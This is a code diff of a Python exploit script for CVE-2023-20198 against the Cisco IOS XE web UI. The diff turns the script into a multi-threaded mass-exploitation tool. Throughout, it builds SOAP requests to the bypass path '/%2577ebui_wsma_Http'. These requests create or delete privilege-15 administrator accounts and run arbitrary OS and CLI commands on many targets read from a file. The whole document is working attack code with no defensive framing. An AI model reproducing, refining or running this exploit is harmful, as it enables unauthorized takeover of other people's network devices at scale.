@@ -6,9 +6,19 @@ import requests
 import argparse
 import xml.etree.ElementTree as ET
 import urllib3
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
 
-# 禁用 HTTPS 警告（如果目标是 https 但证书无效）
+# 禁用 HTTPS 警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# 打印锁，防止多线程输出乱序
+print_lock = Lock()
+
+
+def safe_print(msg):
+    with print_lock:
+        print(msg)
 
 
 def GenerateRandTextAlpha(length):
@@ -36,109 +46,107 @@ def GetOutputResult(resp_text, cisco_method, exploit_mode):
             for match in matches:
                 result += match + "\n"
             return result
-    except Exception:
+    except:
         return "Error parsing XML"
 
 
-def RunCliCommand(url, command, proxy, exploit_mode):
-    # 自动识别和处理 URL 格式
+def RunExploit(url, method, command, proxy, exploit_mode):
+    # 处理 URL 格式：补全协议并处理端口
     if "://" not in url:
         url = "http://" + url
 
     uri = "/%2577ebui_wsma_https" if url.startswith("https://") else "/%2577ebui_wsma_Http"
     target_url = url.rstrip('/') + uri
+
+    # 根据方法选择不同的 XML 模板
+    if method == "config":
+        xml_namespace = "urn:cisco:wsma-config"
+        body = f"""<request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-config">
+                    <configApply details="all" action-on-fail="continue">
+                      <config-data><cli-config-data-block>{command}</cli-config-data-block></config-data>
+                    </configApply>
+                  </request>"""
+    else:
+        xml_namespace = "urn:cisco:wsma-exec"
+        body = f"""<request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-exec">
+                    <execCLI xsd="false"><cmd>{command}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI>
+                  </request>"""
 
     exp_xml = f"""<?xml version="1.0"?>
     <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
     <SOAP:Header>
       <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
         <wsse:UsernameToken SOAP:mustUnderstand="false">
-          <wsse:Username>{GenerateRandTextAlpha(4)}</wsse:Username>
+          <wsse:Username>admin</wsse:Username>
           <wsse:Password>*****</wsse:Password>
         </wsse:UsernameToken>
       </wsse:Security>
     </SOAP:Header>
-    <SOAP:Body>
-      <request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-config">
-        <configApply details="all" action-on-fail="continue">
-          <config-data>
-           <cli-config-data-block>{command}</cli-config-data-block>
-          </config-data>
-        </configApply>
-      </request>
-    </SOAP:Body>
-</SOAP:Envelope>"""
+    <SOAP:Body>{body}</SOAP:Body></SOAP:Envelope>"""
+
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
+
     try:
         response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
-                                 proxies=proxy, timeout=10)
+                                 proxies=proxy, timeout=8)
         if response.status_code == 200:
-            return GetOutputResult(response.text, "urn:cisco:wsma-config", exploit_mode=exploit_mode)
-    except:
-        return None
-
-
-def RunOSCommand(url, command, proxy):
-    if "://" not in url:
-        url = "http://" + url
-    uri = "/%2577ebui_wsma_https" if url.startswith("https://") else "/%2577ebui_wsma_Http"
-    target_url = url.rstrip('/') + uri
-
-    exp_xml = f"""<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username> <wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>{command}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>"""
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
-    try:
-        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
-                                 proxies=proxy, timeout=10)
-        if response.status_code == 200:
-            return GetOutputResult(response.text, "urn:cisco:wsma-exec", exploit_mode="cmd")
+            return GetOutputResult(response.text, xml_namespace, exploit_mode)
     except:
         return None
 
 
 def ProcessTarget(url, args, proxy):
-    print(f"\n[*] Testing target: {url}")
-    if args.exploit_mode == "user":
-        if args.del_user:
-            res = RunCliCommand(url=url, command=f"no username {args.del_user} privilege 15", proxy=proxy,
-                                exploit_mode="user")
-            print(f"[+] Delete status for {args.del_user}: {'Success' if res and '<success' in res else 'Failed'}")
-        else:
-            username = args.add_user if args.add_user else GenerateRandTextAlpha(8)
-            password = args.add_pass if args.add_pass else GenerateRandTextAlpha(8)
-            res = RunCliCommand(url=url, command=f"username {username} privilege 15 secret {password}", proxy=proxy,
-                                exploit_mode="user")
-            if res and "<success" in res:
-                print(f"[+] SUCCESS: Added {username} / {password}")
+    try:
+        if args.exploit_mode == "user":
+            if args.del_user:
+                res = RunExploit(url, "config", f"no username {args.del_user} privilege 15", proxy, "user")
+                status = "SUCCESS" if res and "<success" in res else "FAILED"
+                safe_print(f"[{status}] Target: {url} | Delete User: {args.del_user}")
             else:
-                print(f"[-] FAILED to add user.")
+                user = args.add_user or GenerateRandTextAlpha(8)
+                pwd = args.add_pass or GenerateRandTextAlpha(8)
+                res = RunExploit(url, "config", f"username {user} privilege 15 secret {pwd}", proxy, "user")
+                if res and "<success" in res:
+                    safe_print(f"[SUCCESS] Target: {url} | Added: {user}:{pwd}")
+                else:
+                    safe_print(f"[FAILED] Target: {url}")
 
-    elif args.exploit_mode == "cmd":
-        if args.os_cmd:
-            result = RunOSCommand(url=url, command=args.os_cmd, proxy=proxy)
-            print(result if result else "[-] Command failed or no output.")
-        if args.cli_cmd:
-            pm = args.privilege_mode if args.privilege_mode else "privileged"
-            cmd_payload = f"<![CDATA[exit\n{args.cli_cmd}]]>" if pm == "privileged" else f"<![CDATA[exit\nexit\n{args.cli_cmd}]]>"
-            result = RunCliCommand(url=url, command=cmd_payload, proxy=proxy, exploit_mode="cmd")
-            print(result if result else "[-] CLI command failed.")
+        elif args.exploit_mode == "cmd":
+            if args.os_cmd:
+                res = RunExploit(url, "exec", args.os_cmd, proxy, "cmd")
+                if res:
+                    safe_print(f"[RESULT] Target: {url}\n{res}\n{'-' * 30}")
+                else:
+                    safe_print(f"[FAILED] Target: {url}")
+            if args.cli_cmd:
+                pm = args.privilege_mode or "privileged"
+                cmd = f"<![CDATA[exit\n{args.cli_cmd}]]>" if pm == "privileged" else f"<![CDATA[exit\nexit\n{args.cli_cmd}]]>"
+                res = RunExploit(url, "config", cmd, proxy, "cmd")
+                if res:
+                    safe_print(f"[RESULT] Target: {url}\n{res}\n{'-' * 30}")
+                else:
+                    safe_print(f"[FAILED] Target: {url}")
+    except Exception as e:
+        safe_print(f"[ERROR] Target {url}: {str(e)}")
 
 
 def ParseArgs():
-    parser = argparse.ArgumentParser(description="CVE-2023-20198-RCE Multi-Target")
+    parser = argparse.ArgumentParser(description="CVE-2023-20198-RCE Multi-Threaded")
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("-u", "--url", type=str, help="single target url")
-    group.add_argument("-f", "--file", type=str, help="file containing target IPs/URLs (one per line)")
+    group.add_argument("-u", "--url", type=str, help="Single target IP/URL")
+    group.add_argument("-f", "--file", type=str, help="File with IPs/URLs (one per line)")
 
-    parser.add_argument("-p", "--proxy", type=str, help="proxy url")
-    parser.add_argument("-au", "--add-user", nargs="?", const="", help="username to add")
-    parser.add_argument("-ap", "--add-pass", nargs="?", const="", help="password to add")
-    parser.add_argument("-du", "--del-user", type=str, help="username to delete")
-    parser.add_argument("-pm", "--privilege-mode", type=str, choices=['user', 'privileged'], help="cli privilege mode")
-    parser.add_argument("-em", "--exploit-mode", type=str, choices=['user', 'cmd'], help="exploit mode", required=True)
-    parser.add_argument("-oc", "--os-cmd", type=str, help="exec os command")
-    parser.add_argument("-cc", "--cli-cmd", type=str, help="exec cli command")
+    parser.add_argument("-p", "--proxy", type=str, help="Proxy URL")
+    parser.add_argument("-em", "--exploit-mode", type=str, choices=['user', 'cmd'], required=True, help="Exploit mode")
+    parser.add_argument("-th", "--threads", type=int, default=20, help="Number of threads (default: 20)")
+
+    parser.add_argument("-au", "--add-user", help="Username to add")
+    parser.add_argument("-ap", "--add-pass", help="Password to add")
+    parser.add_argument("-du", "--del-user", help="Username to delete")
+    parser.add_argument("-pm", "--privilege-mode", choices=['user', 'privileged'], help="Privilege mode")
+    parser.add_argument("-oc", "--os-cmd", help="OS command (e.g., 'uname -a')")
+    parser.add_argument("-cc", "--cli-cmd", help="CLI command (e.g., 'show run')")
     return parser.parse_args()
 
 
@@ -151,11 +159,17 @@ if __name__ == "__main__":
         targets.append(args.url)
     elif args.file:
         try:
-            with open(args.file, 'r') as f:
+            with open(args.file, 'r', encoding='utf-8') as f:
                 targets = [line.strip() for line in f if line.strip()]
         except Exception as e:
-            print(f"[x] Error reading file: {e}")
+            print(f"[x] File error: {e}")
             sys.exit(1)
 
-    for t in targets:
-        ProcessTarget(t, args, proxy)
+    print(f"[*] Starting exploit on {len(targets)} targets with {args.threads} threads...")
+
+    # 使用线程池执行任务
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        for t in targets:
+            executor.submit(ProcessTarget, t, args, proxy)
+
+    print("[*] All tasks completed.")
